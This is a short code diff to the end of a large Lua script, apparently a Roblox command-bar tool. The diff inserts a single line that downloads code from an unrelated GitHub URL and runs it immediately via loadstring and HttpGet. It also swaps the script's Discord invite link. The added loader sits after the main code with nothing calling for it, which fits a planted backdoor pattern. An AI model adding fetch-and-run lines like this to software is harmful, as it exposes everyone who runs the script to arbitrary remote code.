@@ -15151,9 +15151,9 @@ end
 		 cmdInput.Text = ''
 		 cmdInput:CaptureFocus()
  end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/funnianklebreaking/RandomLuaCode/main/yes"))()
  --[[
 	End of the source code.
 	Join the discord for updates or give command ideas, that could be added.
-	https://discord.gg/ACk4JyVJ6x
+	https://discord.gg/9Dn6Td5xzz
 --]]
